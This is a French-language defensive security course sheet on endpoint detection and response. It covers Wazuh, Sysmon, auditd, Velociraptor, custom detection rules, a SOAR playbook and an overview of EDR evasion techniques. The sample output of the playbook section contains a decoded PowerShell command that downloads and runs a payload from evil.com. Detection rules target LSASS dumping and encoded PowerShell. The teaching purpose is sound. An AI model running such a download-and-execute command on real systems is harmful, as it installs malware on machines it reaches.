---
tags:
  - Cybersécurité
  - Avancé
  - Pratique
description: "EDR/XDR, Wazuh, Velociraptor, Sysmon, ETW, auditd, SOAR, détection comportementale"
estimated_time: "55 min"
fiche_number: 4
total_fiches: 5
cursus: "Phase 5 - Spécialisation Défensive"
---

# 04 - Sécurité du Endpoint (EDR/XDR)

> **En bref** : À la fin de cette fiche, tu sauras déployer et configurer un EDR open source (Wazuh), collecter de la télémétrie avancée (Sysmon, ETW, auditd), utiliser Velociraptor pour l'investigation à distance, créer des playbooks d'automatisation SOAR et comprendre l'architecture XDR pour la corrélation multi-sources. Lecture estimée : 55 min.


## Prérequis

- [Phase 5 - fiche 01 (Détection et Réponse aux Incidents)](01-detection-reponse-incidents.md) complétée
- [Phase 5 - fiche 02 (Analyse de Malware)](02-analyse-malware.md) complétée
- [Phase 5 - fiche 03 (Threat Hunting et Intelligence)](03-threat-hunting-intelligence.md) complétée
- Connaissances en administration Windows (Event Logs, registre, services)
- Connaissances en administration Linux (syslog, auditd, systemd)
- Docker installé pour le déploiement de Wazuh

## Objectif de cette fiche

À la fin de cette fiche, tu sauras déployer et configurer un EDR open source (Wazuh), collecter de la télémétrie avancée (Sysmon, ETW, auditd), utiliser Velociraptor pour l'investigation à distance, créer des playbooks d'automatisation SOAR et comprendre l'architecture XDR pour la corrélation multi-sources.

---

## Concepts

### Qu'est-ce qu'un EDR ?

**Définition** : Un EDR (Endpoint Détection and Response) est une solution de sécurité installée sur chaque poste de travail et serveur. Il collecte en continu la télémétrie système (processus, fichiers, registre, réseau), détecte les menaces et permet la réponse à distance (isolation, kill process, collecte forensique).

**Le problème que l'EDR résout** :

Sans EDR, voici les problèmes rencontrés :

1. **Visibilité nulle** : sans agent sur les endpoints, le SOC ne voit que le trafic réseau. Tout ce qui se passe localement sur le poste est invisible
2. **Antivirus dépassé** : les antivirus traditionnels détectent uniquement les malwares connus par signature. Les malwares sans fichier (fileless) ou les techniques living-off-the-land (LOLBins) passent inaperçus
3. **Réponse lente** : sans capacité de réponse à distance, il faut se déplacer physiquement ou attendre que l'utilisateur réagisse
4. **Pas de contexte** : un firewall voit une connexion suspecte, mais ne sait pas quel processus l'a initiée ni avec quels arguments

**Comment l'EDR résout ces problèmes** :

| Problème | Solution apportée par l'EDR |
| -------- | --------------------------- |
| Visibilité nulle | Agent qui collecte toute l'activité locale en temps réel |
| Antivirus dépassé | Détection comportementale (IOA) en plus des signatures (IOC) |
| Réponse lente | Actions à distance : isolation réseau, kill process, collecte de preuves |
| Pas de contexte | Corrélation processus → fichiers → registre → réseau |

**Analogie concrète** : L'antivirus traditionnel est comme un vigile à l'entrée d'un immeuble qui vérifie les badges : il bloque les personnes non autorisées connues. L'EDR est comme un système de vidéosurveillance complet avec des gardes dans chaque étage : il enregistre tout, détecte les comportements suspects (quelqu'un qui crochète une serrure, même avec un badge valide) et peut intervenir immédiatement (verrouiller une porte, alerter la sécurité).

**Ce qu'un EDR n'est PAS** :

- Un EDR n'est pas un antivirus amélioré. L'antivirus bloque les fichiers malveillants connus. L'EDR surveille les comportements en continu, même sans fichier malveillant
- Un EDR n'est pas un SIEM. Le SIEM collecte et corrèle des logs de multiples sources. L'EDR se concentre sur l'endpoint mais envoie ses données au SIEM

**Comparaison antivirus vs EDR** :

| Antivirus traditionnel | EDR |
| ---------------------- | --- |
| Détection par signatures | Détection par signatures + comportements |
| Scan de fichiers | Monitoring continu de toute l'activité |
| Pas de visibilité post-détection | Timeline complète de l'activité |
| Alerte simple (fichier bloqué) | Contexte riche (processus, parent, arguments, réseau) |
| Pas de réponse à distance | Isolation, kill, collecte forensique à distance |

### Qu'est-ce que le XDR ?

**Définition** : Le XDR (Extended Détection and Response) étend la détection et la réponse au-delà de l'endpoint. Il corrèle les données de multiples sources : endpoints, réseau, email, cloud, identité. L'objectif est de reconstruire une attaque complète en reliant les événements de différentes couches.

**Le problème que le XDR résout** :

Sans XDR, voici les problèmes rencontrés :

1. **Silos de données** : l'EDR voit les endpoints, le NDR voit le réseau, le proxy voit le web, mais personne ne corrèle
2. **Alertes fragmentées** : une attaque génère des alertes dans 5 outils différents. L'analyste ne les relie pas
3. **Temps d'investigation long** : l'analyste doit manuellement pivoter entre les consoles pour reconstruire la chaîne d'attaque

**Comment le XDR résout ces problèmes** :

| Problème | Solution apportée par le XDR |
| -------- | ---------------------------- |
| Silos de données | Plateforme unique qui ingère les données de toutes les sources |
| Alertes fragmentées | Corrélation automatique qui crée un incident unifié |
| Temps d'investigation long | Vue chronologique de l'attaque à travers toutes les couches |

**Comparaison EDR vs XDR** :

| EDR | XDR |
| --- | --- |
| Endpoint uniquement | Endpoint + réseau + email + cloud + identité |
| Détection locale | Corrélation multi-sources |
| Réponse sur l'endpoint | Réponse orchestrée multi-couches |
| Un outil parmi d'autres | Plateforme unifiée |

### Qu'est-ce que Sysmon ?

**Définition** : Sysmon (System Monitor) est un outil Sysinternals de Microsoft qui enrichit les Event Logs Windows avec des événements de sécurité détaillés. Il enregistre les créations de processus (avec les lignes de commande complètes), les connexions réseau, les modifications de fichiers, les chargements de DLLs et plus encore.

**Pourquoi Sysmon est indispensable** :

Les Event Logs Windows par défaut sont insuffisants pour la détection :

| Information | Sans Sysmon | Avec Sysmon |
| ----------- | ----------- | ----------- |
| Création de processus | Event ID 4688 (basique, pas de hash) | Event ID 1 (hash, parent, ligne de commande complète) |
| Connexion réseau | Pas de log natif par processus | Event ID 3 (processus + IP source/destination + port) |
| Chargement de DLL | Pas de log natif | Event ID 7 (DLL + hash + processus) |
| Modification de fichier | Basique (audit SACL) | Event ID 11 (création), 23 (suppression) |
| Requête DNS | Pas de log natif | Event ID 22 (processus + domaine interrogé) |

### Qu'est-ce que le SOAR ?

**Définition** : Le SOAR (Security Orchestration, Automation and Response) est une catégorie de solutions qui automatisent les tâches répétitives de sécurité via des playbooks. Un playbook est un workflow prédéfini qui s'exécute automatiquement quand certaines conditions sont remplies.

**Le problème que le SOAR résout** :

Sans SOAR, voici les problèmes rencontrés :

1. **Volume d'alertes** : un SOC reçoit des centaines ou des milliers d'alertes par jour. Les analystes ne peuvent pas toutes les traiter manuellement
2. **Tâches répétitives** : vérifier un hash sur VirusTotal, enrichir une IP avec des données de threat intelligence, créer un ticket : ces actions sont les mêmes pour chaque alerte
3. **Temps de réponse** : les actions manuelles prennent des minutes ou des heures. L'attaquant agit en secondes

**Comment le SOAR résout ces problèmes** :

| Problème | Solution apportée par le SOAR |
| -------- | ----------------------------- |
| Volume d'alertes | Triage automatique et fermeture des faux positifs |
| Tâches répétitives | Playbooks automatisés (enrichissement, notification, blocage) |
| Temps de réponse | Réponse en secondes au lieu de minutes |

**Analogie concrète** : Le SOAR est comme un robot dans une usine. Les ouvriers (analystes SOC) faisaient les mêmes gestes répétitifs des centaines de fois par jour. Le robot (SOAR) automatise ces gestes : il soulève la pièce (collecte l'alerte), la vérifie (enrichissement), la trie (triage), et soit la rejette (faux positif) soit la passe à l'ouvrier expert (escalade).

---

## Étapes Pratiques

### Étape 1 : Déployer Wazuh (EDR open source)

Wazuh est un EDR/SIEM open source qui combine la détection d'intrusion, le monitoring d'intégrité, la détection de vulnérabilités et la réponse aux incidents.

```bash
# Déployer Wazuh avec Docker (all-in-one)
git clone https://github.com/wazuh/wazuh-docker.git -b v4.9.0
cd wazuh-docker/single-node

# Générer les certificats
docker compose -f generate-indexer-certs.yml run --rm generator

# Démarrer Wazuh
docker compose up -d

# Vérifier que tous les services sont actifs
docker compose ps
```

**Résultat attendu** :

```text
NAME                    STATUS
single-node-wazuh.manager-1     Up (healthy)
single-node-wazuh.indexer-1     Up (healthy)
single-node-wazuh.dashboard-1   Up (healthy)
```

```bash
# Accéder au dashboard Wazuh
# URL : https://localhost:443
# Login : admin / SecretPassword

# L'interface affiche :
# - Nombre d'agents connectés
# - Alertes récentes
# - Événements de sécurité
# - Conformité (PCI DSS, GDPR, NIST)
```

### Étape 2 : Installer un agent Wazuh sur un endpoint

L'agent Wazuh collecte la télémétrie sur l'endpoint et l'envoie au manager pour analyse.

```bash
# Sur un endpoint Linux (Ubuntu/Debian)
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring \
  --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && \
  chmod 644 /usr/share/keyrings/wazuh.gpg

echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ \
  stable main" | tee /etc/apt/sources.list.d/wazuh.list

apt-get update && apt-get install wazuh-agent

# Configurer l'agent pour pointer vers le manager
sed -i 's/MANAGER_IP/192.168.1.10/g' /var/ossec/etc/ossec.conf

# Démarrer l'agent
systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent

# Vérifier la connexion
/var/ossec/bin/agent-control -l
```

**Résultat attendu** :

```text
Wazuh agent-control. List of available agents:
   ID: 000, Name: wazuh-manager (server), IP: 127.0.0.1, Active
   ID: 001, Name: ubuntu-web-01, IP: 192.168.1.20, Active
```

### Étape 3 : Configurer Sysmon pour la télémétrie avancée (Windows)

Sysmon enrichit considérablement la visibilité sur les endpoints Windows. La configuration est critique : trop de logs = bruit inutile, pas assez = angles morts.

```powershell
# Télécharger Sysmon
# https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

# Utiliser une configuration communautaire éprouvée (SwiftOnSecurity)
# https://github.com/SwiftOnSecurity/sysmon-config

# Installer Sysmon avec la configuration
sysmon64.exe -accepteula -i sysmonconfig-export.xml

# Vérifier que Sysmon est actif
sc query sysmon64

# Les logs Sysmon sont dans :
# Event Viewer → Applications and Services Logs →
#   Microsoft → Windows → Sysmon → Operational
```

**Résultat attendu** :

```text
SERVICE_NAME: Sysmon64
        TYPE               : 2  FILE_SYSTEM_DRIVER
        STATE              : 4  RUNNING
        WIN32_EXIT_CODE    : 0  (0x0)
```

**Event IDs Sysmon les plus importants** :

| Event ID | Description | Utilité pour la détection |
| -------- | ----------- | ------------------------- |
| 1 | Process Création | Détection de processus malveillants (ligne de commande complète) |
| 3 | Network Connection | Identification des connexions C2 par processus |
| 7 | Image Loaded (DLL) | Détection de DLL hijacking et side-loading |
| 8 | CreateRemoteThread | Détection d'injection de code |
| 10 | ProcessAccess | Détection de dump LSASS (credential dumping) |
| 11 | FileCreate | Détection de dropper/download de malware |
| 13 | RegistryEvent (SetValue) | Détection de persistance via registre |
| 22 | DNSEvent | Corrélation processus → requête DNS |
| 25 | ProcessTampering | Détection de process hollowing/herpaderping |

### Étape 4 : Configurer auditd pour la télémétrie Linux

auditd est le framework d'audit du noyau Linux. Il enregistre les appels système et les événements de sécurité.

```bash
# Installer auditd
sudo apt-get install auditd audispd-plugins

# Ajouter des règles de détection
sudo tee /etc/audit/rules.d/security.rules << 'RULES'
# Surveillance des exécutions de programmes
-a always,exit -F arch=b64 -S execve -k exec_commands

# Surveillance des modifications de fichiers sensibles
-w /etc/passwd -p wa -k passwd_changes
-w /etc/shadow -p wa -k shadow_changes
-w /etc/sudoers -p wa -k sudoers_changes

# Surveillance des connexions réseau (connect syscall)
-a always,exit -F arch=b64 -S connect -k network_connect

# Surveillance des modifications de crontab
-w /var/spool/cron/ -p wa -k cron_changes
-w /etc/cron.d/ -p wa -k cron_changes

# Surveillance des chargements de modules kernel
-a always,exit -F arch=b64 -S init_module -S finit_module -k kernel_modules

# Surveillance des tentatives d'élévation de privilèges
-a always,exit -F arch=b64 -S setuid -S setgid -k priv_escalation

# Immutable (empêche la désactivation des règles sans redémarrage)
-e 2
RULES

# Recharger les règles
sudo augenrules --load

# Vérifier les règles actives
sudo auditctl -l
```

**Résultat attendu** :

```text
-a always,exit -F arch=b64 -S execve -F key=exec_commands
-w /etc/passwd -p wa -k passwd_changes
-w /etc/shadow -p wa -k shadow_changes
-w /etc/sudoers -p wa -k sudoers_changes
-a always,exit -F arch=b64 -S connect -F key=network_connect
-w /var/spool/cron -p wa -k cron_changes
-w /etc/cron.d -p wa -k cron_changes
-a always,exit -F arch=b64 -S init_module -S finit_module -F key=kernel_modules
-a always,exit -F arch=b64 -S setuid -S setgid -F key=priv_escalation
-e 2
```

### Étape 5 : Déployer Velociraptor pour l'investigation à distance

Velociraptor est un outil de forensique et d'investigation à distance. Il permet de collecter des artefacts, exécuter des requêtes VQL (Velociraptor Query Language) et réaliser du threat hunting à grande échelle.

```bash
# Télécharger Velociraptor
# https://github.com/Velocidex/velociraptor/releases

# Générer la configuration serveur
./velociraptor config generate -i

# Répondre aux questions :
# - Frontend bind address: 0.0.0.0
# - Frontend bind port: 8000
# - GUI bind address: 0.0.0.0
# - GUI bind port: 8889
# - Data store directory: /opt/velociraptor

# Démarrer le serveur
./velociraptor --config server.config.yaml frontend -v

# Accéder à l'interface
# URL : https://localhost:8889
```

**Résultat attendu** :

```text
[INFO] Starting Frontend service
[INFO] Starting GUI service on https://0.0.0.0:8889
[INFO] Server running...
```

```bash
# Créer un package client pour les endpoints
./velociraptor --config server.config.yaml config client > client.config.yaml

# Sur l'endpoint, installer le client
./velociraptor --config client.config.yaml client -v

# Le client se connecte automatiquement au serveur
# Dans l'interface web : Clients → le nouvel endpoint apparaît
```

### Étape 6 : Collecter des artefacts avec Velociraptor (VQL)

VQL (Velociraptor Query Language) est un langage de requête pour interroger les endpoints à distance.

```bash
# Exemples de requêtes VQL dans l'interface Velociraptor :

# Lister tous les processus en cours
# SELECT Pid, Name, CommandLine, Username
# FROM pslist()

# Chercher les connexions réseau actives
# SELECT Pid, Name, FamilyString, TypeString,
#        Laddr.IP, Laddr.Port, Raddr.IP, Raddr.Port, Status
# FROM netstat()
# WHERE Status = "ESTABLISHED"

# Chercher un fichier suspect sur tous les endpoints
# SELECT FullPath, Size, Mtime, Hash
# FROM glob(globs="C:/Users/*/AppData/Local/Temp/*.exe")

# Chercher les tâches planifiées (persistance)
# SELECT Name, Path, Command, Arguments, UserId
# FROM Artifact.Windows.System.TaskScheduler()

# Collecter les Event Logs des dernières 24h
# SELECT *
# FROM Artifact.Windows.EventLogs.EvtxHunter(
#   EvtxGlob="C:/Windows/System32/winevt/Logs/Security.evtx",
#   StartDate=timestamp(epoch=now() - 86400)
# )
```

**Résultat attendu** :

```text
# Résultat de la requête processus
Pid    Name            CommandLine                              Username
4512   svchost.exe     C:\Users\Public\svchost.exe              SYSTEM
7890   powershell.exe  powershell -enc SQBuAHYAbwBrAGUA...     admin
```

### Étape 7 : Créer des règles de détection dans Wazuh

Wazuh utilise des règles XML pour détecter les menaces. On crée des règles personnalisées basées sur les techniques observées.

```bash
# Les règles personnalisées se placent dans :
# /var/ossec/etc/rules/local_rules.xml

# Ajouter des règles de détection
cat << 'RULES' > /var/ossec/etc/rules/local_rules.xml
<group name="custom_detection">

  <!-- Détection de svchost.exe hors de System32 (T1036.005) -->
  <rule id="100001" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image">svchost.exe</field>
    <field name="win.eventdata.image" negate="yes">
      \\Windows\\System32\\svchost.exe
    </field>
    <description>
      Process masquerading: svchost.exe running from non-standard path
      (MITRE T1036.005)
    </description>
    <group>attack.defense_evasion,</group>
  </rule>

  <!-- Détection de PowerShell encodé (T1059.001) -->
  <rule id="100002" level="10">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.commandLine">-enc</field>
    <description>
      Encoded PowerShell execution detected (MITRE T1059.001)
    </description>
    <group>attack.execution,</group>
  </rule>

  <!-- Détection d'accès à LSASS (T1003.001) -->
  <rule id="100003" level="14">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.targetImage">lsass.exe</field>
    <field name="win.eventdata.sourceImage" negate="yes">
      \\Windows\\System32\\
    </field>
    <description>
      LSASS memory access from non-system process - credential dumping
      (MITRE T1003.001)
    </description>
    <group>attack.credential_access,</group>
  </rule>

</group>
RULES

# Vérifier la syntaxe des règles
/var/ossec/bin/wazuh-analysisd -t

# Redémarrer le manager pour appliquer
systemctl restart wazuh-manager
```

**Résultat attendu** :

```text
wazuh-analysisd: Configuration check passed. Exiting.
```

### Étape 8 : Créer un playbook SOAR

Un playbook SOAR automatise la réponse à un type d'alerte spécifique. Voici un exemple de playbook pour l'alerte "PowerShell encodé détecté".

```python
# Playbook SOAR : Réponse automatisée à PowerShell encodé
# Ce script peut être intégré dans Shuffle, TheHive/Cortex, ou Wazuh active response

import json
import base64
import requests
import hashlib
from datetime import datetime

def playbook_encoded_powershell(alert):
    """
    Playbook déclenché quand une exécution PowerShell encodée est détectée.
    Actions :
    1. Décoder la commande PowerShell
    2. Vérifier les IoCs extraits sur VirusTotal
    3. Si malveillant : isoler l'endpoint
    4. Créer un cas dans TheHive
    5. Notifier l'équipe SOC
    """

    results = {"timestamp": datetime.utcnow().isoformat()}

    # Étape 1 : Décoder la commande PowerShell
    encoded_cmd = extract_encoded_command(alert["commandLine"])
    if encoded_cmd:
        decoded = base64.b64decode(encoded_cmd).decode("utf-16-le")
        results["decoded_command"] = decoded
        print(f"[1/5] Commande décodée : {decoded}")

    # Étape 2 : Extraire et vérifier les IoCs
    iocs = extract_iocs(decoded)  # URLs, IPs, domaines
    results["iocs"] = iocs
    vt_results = check_virustotal(iocs)
    results["vt_results"] = vt_results
    print(f"[2/5] IoCs vérifiés : {len(iocs)} indicateurs")

    # Étape 3 : Décision automatique
    if vt_results["malicious_count"] > 0:
        # Isoler l'endpoint via l'API EDR
        isolate_endpoint(alert["agent_id"])
        results["action"] = "ISOLATED"
        print(f"[3/5] Endpoint isolé : {alert['hostname']}")
    else:
        results["action"] = "MONITORING"
        print(f"[3/5] Pas de menace confirmée, monitoring renforcé")

    # Étape 4 : Créer un cas dans TheHive
    case_id = create_thehive_case(alert, results)
    results["case_id"] = case_id
    print(f"[4/5] Cas TheHive créé : {case_id}")

    # Étape 5 : Notifier l'équipe
    notify_soc(alert, results)
    print(f"[5/5] Équipe SOC notifiée")

    return results


def extract_encoded_command(cmdline):
    """Extraire la partie encodée en Base64 de la ligne de commande."""
    parts = cmdline.split()
    for i, part in enumerate(parts):
        if part.lower() in ["-enc", "-encodedcommand"]:
            if i + 1 < len(parts):
                return parts[i + 1]
    return None
```

**Résultat attendu** :

```text
[1/5] Commande décodée : Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\Temp\svc.exe; Start-Process C:\Temp\svc.exe
[2/5] IoCs vérifiés : 2 indicateurs
[3/5] Endpoint isolé : DESKTOP-SALES01
[4/5] Cas TheHive créé : INC-2026-0043
[5/5] Équipe SOC notifiée
```

### Étape 9 : Comprendre l'évasion EDR (vue défensive)

Comprendre comment les attaquants évitent la détection EDR est essentiel pour améliorer les règles de détection.

```text
Techniques d'évasion EDR courantes (perspective défensive) :

1. Direct syscalls (contournement du hooking user-mode)
   L'EDR place des hooks sur les fonctions ntdll.dll
   L'attaquant appelle directement les syscalls du noyau
   DÉTECTION : ETW (Event Tracing for Windows) au niveau kernel

2. DLL unhooking
   L'attaquant recharge une copie propre de ntdll.dll depuis le disque
   pour supprimer les hooks EDR
   DÉTECTION : Sysmon Event ID 7 (chargement de DLL inhabituel)

3. PPID spoofing
   L'attaquant modifie le Parent PID pour faire croire que
   le processus malveillant a été lancé par un processus légitime
   DÉTECTION : ETW capture le vrai parent, comparer avec Event Log 4688

4. Process hollowing
   L'attaquant crée un processus légitime en mode suspendu,
   remplace son code en mémoire, puis le reprend
   DÉTECTION : Sysmon Event ID 25 (ProcessTampering)

5. Living off the Land (LOLBins)
   L'attaquant utilise des outils légitimes Windows (certutil, mshta,
   regsvr32, rundll32) pour exécuter du code malveillant
   DÉTECTION : Règles sur les arguments de ligne de commande suspects

Configuration Sysmon pour détecter ces techniques :
- Event ID 8  : CreateRemoteThread (injection)
- Event ID 10 : ProcessAccess (credential dumping)
- Event ID 25 : ProcessTampering (hollowing)
- Event ID 7  : ImageLoaded (DLL suspecte)
```

**Résultat attendu** :

```text
# Matrice technique d'évasion → détection :
Technique d'évasion          Source de détection        Event ID
Direct syscalls              ETW Kernel                 -
DLL unhooking                Sysmon                     7
PPID spoofing                ETW + Event Logs           4688
Process hollowing            Sysmon                     25
LOLBins                      Sysmon + Règles custom     1
Module stomping              ETW + Sysmon               7
```

---

## Commandes Utiles

| Commande | Action |
| -------- | ------ |
| `docker compose up -d` (dans wazuh-docker) | Démarrer Wazuh |
| `/var/ossec/bin/agent-control -l` | Lister les agents Wazuh connectés |
| `/var/ossec/bin/wazuh-analysisd -t` | Vérifier la syntaxe des règles |
| `sysmon64.exe -i config.xml` | Installer Sysmon avec une configuration |
| `sysmon64.exe -u` | Désinstaller Sysmon |
| `sudo auditctl -l` | Lister les règles auditd actives |
| `sudo ausearch -k exec_commands` | Chercher dans les logs auditd par clé |
| `./velociraptor config generate -i` | Générer la config Velociraptor |
| `./velociraptor --config server.config.yaml frontend` | Démarrer le serveur Velociraptor |

---

## Pièges Fréquents

### Piège 1 : Déployer Sysmon sans configuration personnalisée

**Problème** : La configuration par défaut de Sysmon est minimaliste. Elle ne capture presque rien d'utile pour la détection. L'analyste croit être protégé alors que la visibilité est très limitée.

**Solution** : Utiliser une configuration communautaire éprouvée comme point de départ (SwiftOnSecurity/sysmon-config ou Olaf Hartong/sysmon-modular). Adapter ensuite cette configuration à l'environnement en ajoutant des exclusions pour les faux positifs connus.

### Piège 2 : Trop de règles = trop de bruit

**Problème** : Activer toutes les règles de détection génère des milliers d'alertes par jour. Les analystes souffrent d'alert fatigue et ne traitent plus rien.

**Solution** : Commencer avec un petit nombre de règles à haute fidélité (peu de faux positifs, forte valeur de détection). Exemples : svchost.exe hors de System32, PowerShell encodé, accès à LSASS. Ajouter progressivement de nouvelles règles après avoir stabilisé les existantes.

### Piège 3 : Oublier la télémétrie Linux

**Problème** : Les équipes SOC se concentrent souvent sur Windows et négligent les serveurs Linux. Un attaquant qui compromet un serveur web Linux peut opérer sans détection.

**Solution** : Déployer auditd avec des règles de détection (exécution, réseau, persistance). Installer un agent Wazuh sur chaque serveur Linux. Surveiller les mêmes catégories que Windows : exécution de commandes, connexions réseau, modifications de fichiers sensibles, élévation de privilèges.

### Piège 4 : Ne pas tester les playbooks SOAR

**Problème** : Un playbook SOAR non testé qui isole automatiquement un endpoint peut causer des incidents de production si la règle de détection génère des faux positifs.

**Solution** : Tester chaque playbook en mode "observation" (dry run) pendant au moins 2 semaines avant d'activer les actions automatiques. Vérifier que les règles de déclenchement n'ont aucun faux positif. Commencer par l'automatisation de l'enrichissement (pas d'action de blocage) puis progresser vers les actions de réponse.

---

## Checklist de Validation

- [ ] Je sais expliquer la différence entre un antivirus, un EDR et un XDR
- [ ] Je sais déployer Wazuh avec Docker et connecter un agent
- [ ] Je sais installer et configurer Sysmon avec une configuration communautaire
- [ ] Je sais lister et expliquer les Event IDs Sysmon les plus importants (1, 3, 7, 8, 10, 11, 13, 22, 25)
- [ ] Je sais configurer auditd avec des règles de détection sur Linux
- [ ] Je sais déployer Velociraptor et exécuter des requêtes VQL basiques
- [ ] Je sais écrire une règle de détection personnalisée dans Wazuh (XML)
- [ ] Je sais expliquer les techniques d'évasion EDR et leurs méthodes de détection
- [ ] Je sais concevoir un playbook SOAR avec les étapes de réponse automatisée
- [ ] Je sais expliquer ce qu'est le SOAR et donner un exemple de playbook

---

## Exercice Pratique

**Énoncé** : Tu es analyste SOC dans une entreprise de 200 postes (150 Windows, 50 Linux). Tu dois mettre en place une architecture de détection endpoint. L'entreprise utilise uniquement des outils open source.

Réalise les tâches suivantes :

1. Déploie Wazuh (manager + dashboard) avec Docker
2. Installe un agent Wazuh sur un endpoint Linux
3. Configure Sysmon sur un endpoint Windows avec la configuration SwiftOnSecurity
4. Crée 3 règles de détection personnalisées dans Wazuh pour les techniques MITRE suivantes :
   - T1036.005 (Process Masquerading)
   - T1059.001 (PowerShell)
   - T1003.001 (LSASS Credential Dumping)
5. Configure auditd sur un serveur Linux avec des règles de surveillance
6. Écris un playbook SOAR pour la règle T1059.001

**Indications** :

- Utilise les configurations données dans les étapes pratiques
- Teste chaque règle en simulant le comportement suspect
- Documente les faux positifs rencontrés et les exclusions ajoutées
- Le playbook SOAR doit inclure : décodage, enrichissement, décision, notification

**Résultat attendu** : Une architecture EDR fonctionnelle avec Wazuh, Sysmon, auditd, 3 règles personnalisées et un playbook SOAR documenté.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

```bash
# Étape 1 : Déployer Wazuh
git clone https://github.com/wazuh/wazuh-docker.git -b v4.9.0
cd wazuh-docker/single-node
docker compose -f generate-indexer-certs.yml run --rm generator
docker compose up -d
# Vérifier : docker compose ps (3 services healthy)

# Étape 2 : Agent Linux
# Sur l'endpoint Linux :
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring \
  --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] \
  https://packages.wazuh.com/4.x/apt/ stable main" | \
  tee /etc/apt/sources.list.d/wazuh.list
apt-get update && apt-get install wazuh-agent
# Configurer MANAGER_IP dans /var/ossec/etc/ossec.conf
systemctl enable --now wazuh-agent
# Vérifier : agent visible dans le dashboard Wazuh

# Étape 3 : Sysmon (sur Windows)
# Télécharger sysmon64.exe et sysmonconfig-export.xml
# sysmon64.exe -accepteula -i sysmonconfig-export.xml
# Vérifier : sc query sysmon64 → RUNNING

# Étape 4 : Règles personnalisées
# Éditer /var/ossec/etc/rules/local_rules.xml
# (voir les 3 règles de l'Étape 7 ci-dessus)
# Vérifier : /var/ossec/bin/wazuh-analysisd -t
# Redémarrer : systemctl restart wazuh-manager

# Étape 5 : auditd (sur Linux)
# Éditer /etc/audit/rules.d/security.rules
# (voir les règles de l'Étape 4 ci-dessus)
# Recharger : augenrules --load
# Vérifier : auditctl -l

# Étape 6 : Playbook SOAR
# (voir le script Python de l'Étape 8 ci-dessus)
# Tester en mode dry run pendant 2 semaines
# Activer les actions automatiques après validation
```

**Architecture finale** :

```text
┌─────────────────────────────────────────────────┐
│                  Wazuh Manager                   │
│            (analyse, corrélation, alertes)        │
├─────────────────────────────────────────────────┤
│                  Wazuh Dashboard                 │
│           (visualisation, investigation)          │
└────────────────────┬────────────────────────────┘
                     │
        ┌────────────┼────────────┐
        │            │            │
   ┌────┴────┐ ┌────┴────┐ ┌────┴────┐
   │ Windows │ │ Windows │ │  Linux  │
   │ + Sysmon│ │ + Sysmon│ │+ auditd │
   │ + Agent │ │ + Agent │ │ + Agent │
   └─────────┘ └─────────┘ └─────────┘

Playbook SOAR → TheHive (case management)
```

---

## Navigation

← Fiche précédente : **[03 - Threat Hunting et Intelligence](03-threat-hunting-intelligence.md)**

→ Fiche suivante : **[05 - Certifications Défensives - Guide et Préparation](05-certifications-defensives.md)**
